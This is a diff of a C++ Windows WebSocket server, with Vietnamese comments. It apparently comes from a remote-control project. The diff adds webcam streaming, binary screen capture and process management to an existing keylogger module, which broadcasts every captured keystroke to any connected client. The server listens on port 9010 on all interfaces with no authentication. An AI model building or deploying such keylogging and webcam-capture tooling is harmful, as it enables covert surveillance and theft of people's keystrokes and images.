@@ -1,28 +1,23 @@
-// main.cpp – WebSocket Server tích hợp CommandDispatcher mới
-// Build: Boost.Beast, nlohmann/json, User Modules
-
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
-
 #include <boost/beast/core.hpp>
 #include <boost/beast/websocket.hpp>
 #include <boost/asio/ip/tcp.hpp>
-
 #include <iostream>
 #include <string>
 #include <thread>
 #include <mutex>
 #include <vector>
 #include <algorithm>
-
 #include <nlohmann/json.hpp>
 
-// --- INCLUDE DISPATCHER VÀ INTERFACE ---
+// Include các module
 #include "core/CommandDispatcher.hpp"
 #include "interfaces/IRemoteModule.hpp"
-
-// --- INCLUDE MODULE KEYMANAGER (Vẫn cần biến toàn cục cho Hook) ---
-#include "modules/KeyManager.hpp" 
+#include "modules/KeyManager.hpp"
+#include "modules/WebcamManager.hpp"
+#include "modules/ScreenManager.hpp"  // Phải có file này (chứa hàm static capture_screen_data)
+#include "modules/ProcessManager.hpp" // Module vừa tách file
 
 namespace beast     = boost::beast;
 namespace websocket = beast::websocket;
@@ -30,174 +25,179 @@ namespace net       = boost::asio;
 using tcp           = net::ip::tcp;
 using json          = nlohmann::json;
 
-// ============================================================
-// 1. GLOBALS & HELPERS
-// ============================================================
-
+// ==================== GLOBALS ====================
 static std::mutex cout_mtx;
-KeyManager keyManager; // Biến toàn cục để quản lý Hook
+KeyManager keyManager;
+CommandDispatcher g_dispatcher;
 
-// --- ADAPTER CHO KEYMANAGER ---
-// Vì KeyManager cần là biến toàn cục (để Hook chạy ổn định), 
-// nhưng Dispatcher lại cần unique_ptr<IRemoteModule>.
-// Ta tạo class này để làm cầu nối.
 class KeyManagerAdapter : public IRemoteModule {
 public:
     const std::string& get_module_name() const override { 
-        static const std::string name = "KEYBOARD";
-        return name;
+        static const std::string name = "KEYBOARD"; return name; 
     }
-    
-    json handle_command(const json& request) override {
-        // Chuyển tiếp lệnh vào biến toàn cục keyManager
-        return keyManager.handle_command(request);
-    }
+    json handle_command(const json& request) override { return keyManager.handle_command(request); }
 };
 
-// Khởi tạo Dispatcher (Nó sẽ tự new Process, System, App, Screen trong Constructor)
-CommandDispatcher g_dispatcher; 
-
-// ============================================================
-// 2. SESSION MANAGER (Broadcast Keylog)
-// ============================================================
+// ==================== SESSION MANAGER ====================
 class SessionManager {
 public:
     void join(websocket::stream<tcp::socket>* ws) {
         std::lock_guard<std::mutex> lock(mutex_);
         sessions_.push_back(ws);
     }
-
     void leave(websocket::stream<tcp::socket>* ws) {
         std::lock_guard<std::mutex> lock(mutex_);
         sessions_.erase(std::remove(sessions_.begin(), sessions_.end(), ws), sessions_.end());
     }
-
     void broadcast(const std::string& message) {
         std::lock_guard<std::mutex> lock(mutex_);
         for (auto* ws : sessions_) {
             try {
                 ws->text(true);
                 ws->write(net::buffer(message));
-            } catch (...) {} // Bỏ qua lỗi nếu client disconnect đột ngột
+            } catch (...) {}
         }
     }
-
 private:
     std::vector<websocket::stream<tcp::socket>*> sessions_;
     std::mutex mutex_;
 };
-
 static SessionManager g_sessionManager;
 
-// ============================================================
-// 3. SESSION LOOP
-// ============================================================
+// ==================== SESSION LOOP ====================
 void do_session(tcp::socket s) {
-    websocket::stream<tcp::socket> ws{std::move(s)};
+    auto ws = std::make_shared<websocket::stream<tcp::socket>>(std::move(s));
     
-    try {
-        // Info Client
-        std::string client_ip = ws.next_layer().remote_endpoint().address().to_string();
-        {
-            std::lock_guard<std::mutex> lk(cout_mtx);
-            std::cout << "[SESSION] NEW CONNECTION: " << client_ip << "\n";
-        }
+    // Mutex để đồng bộ hóa việc gửi dữ liệu (tránh tranh chấp giữa Main Thread và Webcam Thread)
+    auto ws_mutex = std::make_shared<std::mutex>();
 
-        ws.accept();
-        g_sessionManager.join(&ws);
+    try {
+        // Log kết nối
+        std::string client_ip = ws->next_layer().remote_endpoint().address().to_string();
+        { std::lock_guard<std::mutex> lk(cout_mtx); std::cout << "[SESSION] CONNECTED: " << client_ip << "\n"; }
+
+        ws->accept();
+        g_sessionManager.join(ws.get());
 
         for (;;) {
             beast::flat_buffer buffer;
-            ws.read(buffer); // Block chờ lệnh
+            ws->read(buffer); // Block chờ tin nhắn từ Client
             
             std::string req_str = beast::buffers_to_string(buffer.data());
-            
-            // Parse & Dispatch
             json request, response;
+            bool response_sent_binary = false; // Cờ đánh dấu nếu đã gửi binary rồi
+
             try {
                 request = json::parse(req_str);
+                std::string module = request.value("module", "");
+                std::string cmd = request.value("command", "");
 
-                // Log
-                {
-                    std::lock_guard<std::mutex> lk(cout_mtx);
-                    std::string mod = request.value("module", "?");
-                    std::string cmd = request.value("command", "?");
-                    std::cout << "[RECV] " << mod << " -> " << cmd << "\n";
+                // --- 1. XỬ LÝ WEBCAM (STREAM) ---
+                if (module == "WEBCAM") {
+                    auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"));
+                    if (cam) {
+                        if (cmd == "START_STREAM") {
+                            std::cout << "[MAIN] Webcam Stream Started\n";
+                            // Callback chạy trên thread riêng của WebcamManager
+                            cam->start_stream([ws, ws_mutex](const std::vector<uint8_t>& data) {
+                                std::lock_guard<std::mutex> lock(*ws_mutex);
+                                try {
+                                    if(ws->is_open()) {
+                                        ws->binary(true); // Chế độ Binary
+                                        ws->write(net::buffer(data.data(), data.size()));
+                                    }
+                                } catch (...) {}
+                            });
+                            response = {{"status", "success"}, {"message", "Stream Started"}};
+                        } 
+                        else if (cmd == "STOP_STREAM") {
+                            cam->stop_stream();
+                            response = {{"status", "success"}, {"message", "Stream Stopped"}};
+                        }
+                    }
+                } 
+
+                // --- 2. XỬ LÝ SCREENSHOT (BINARY MODE - TỐI ƯU) ---
+                else if (module == "SCREEN" && cmd == "CAPTURE_BINARY") {
+                    std::vector<uint8_t> jpg_data;
+                    std::string err;
+                    
+                    // Gọi hàm static chụp ảnh JPEG (đã cài đặt ở ScreenManager_win.cpp)
+                    if (ScreenManager::capture_screen_data(jpg_data, err)) {
+                        {
+                            std::lock_guard<std::mutex> lock(*ws_mutex);
+                            ws->binary(true);
+                            ws->write(net::buffer(jpg_data.data(), jpg_data.size()));
+                        }
+                        // Client nhận binary xong không cần JSON response chứa ảnh nữa
+                        // Nhưng ta vẫn gửi JSON xác nhận lệnh đã xong (Client có thể ignore)
+                        response = {{"module", "SCREEN"}, {"command", "CAPTURE_COMPLETE"}, {"status", "success"}};
+                        response_sent_binary = true; 
+                    } else {
+                        response = {{"status", "error"}, {"message", err}};
+                    }
                 }
 
-                // GỌI DISPATCHER TẠI ĐÂY
-                response = g_dispatcher.dispatch(request);
+                // --- 3. CÁC LỆNH THƯỜNG (Process, App, System...) ---
+                else {
+                    response = g_dispatcher.dispatch(request);
+                }
 
             } catch (const std::exception& e) {
                 response = {{"status", "error"}, {"message", e.what()}};
             }
 
-            ws.text(true);
-            ws.write(net::buffer(response.dump()));
+            // Gửi phản hồi JSON kết thúc lệnh (trừ khi cần thiết)
+            {
+                std::lock_guard<std::mutex> lock(*ws_mutex);
+                ws->text(true); // Chuyển về Text mode
+                ws->write(net::buffer(response.dump()));
+            }
         }
 
-    } catch (const beast::system_error& se) {
-        if (se.code() != websocket::error::closed) {
-            std::cerr << "[ERROR] Beast: " << se.code().message() << "\n";
-        }
     } catch (const std::exception& e) {
-        std::cerr << "[ERROR] Session: " << e.what() << "\n";
+        { std::lock_guard<std::mutex> lk(cout_mtx); std::cerr << "[SESSION END] " << e.what() << "\n"; }
+        
+        // Stop webcam nếu client ngắt kết nối đột ngột
+        if (auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"))) {
+            cam->stop_stream();
+        }
     }
 
-    g_sessionManager.leave(&ws);
+    g_sessionManager.leave(ws.get());
 }
 
-// ============================================================
-// 4. MAIN
-// ============================================================
 int main() {
     SetConsoleOutputCP(CP_UTF8);
-    std::cout << std::unitbuf;
+    std::cout << "=== REMOTE SERVER (Binary Optimized) ===\n";
 
-    std::cout << "=== REMOTE CONTROL SERVER (OOP Dispatcher) ===\n";
-
-    // --- A. ĐĂNG KÝ MODULE ---
-    // Các module Process, System, Screen, App ĐÃ ĐƯỢC đăng ký trong Constructor của CommandDispatcher.
-    
-    // Riêng KEYBOARD cần đăng ký thủ công qua Adapter để kết nối với biến toàn cục
+    // Đăng ký module
     g_dispatcher.register_module(std::make_unique<KeyManagerAdapter>());
+    // ProcessManager giờ đã được đăng ký tự động trong constructor của CommandDispatcher 
+    // (Nếu bạn sửa CommandDispatcher.hpp), hoặc đăng ký thủ công tại đây nếu muốn:
+    // g_dispatcher.register_module(std::make_unique<ProcessManager>());
 
-
-    // --- B. SETUP KEYLOGGER CALLBACK ---
-    // Khi KeyManager bắt phím -> Gọi Broadcast
+    // Callback cho Keylogger
     KeyManager::set_callback([&](std::string key_char) {
-        json msg;
-        msg["module"] = "KEYBOARD";
-        msg["command"] = "PRESS";
+        json msg; 
+        msg["module"] = "KEYBOARD"; 
+        msg["command"] = "PRESS"; 
         msg["data"] = { {"key", key_char} };
-        
-        // Debug log
-        std::cout << "[KEY] " << key_char << "\n";
-        
-        // Gửi cho tất cả Client
         g_sessionManager.broadcast(msg.dump());
     });
 
-
-    // --- C. KHỞI TẠO SERVER ---
     try {
-        const unsigned short port = 9010;
-        auto address = net::ip::make_address("0.0.0.0");
         net::io_context ioc{1};
-        tcp::acceptor acceptor{ioc, {address, port}};
-
-        std::cout << "[SERVER] Listening on port " << port << "...\n";
+        tcp::acceptor acceptor{ioc, {net::ip::make_address("0.0.0.0"), 9010}};
+        std::cout << "[SERVER] Listening on port 9010...\n";
 
         for (;;) {
             tcp::socket socket{ioc};
             acceptor.accept(socket);
             std::thread(do_session, std::move(socket)).detach();
         }
-
     } catch (const std::exception& e) {
         std::cerr << "[FATAL] " << e.what() << "\n";
-        return 1;
     }
-
     return 0;
 }
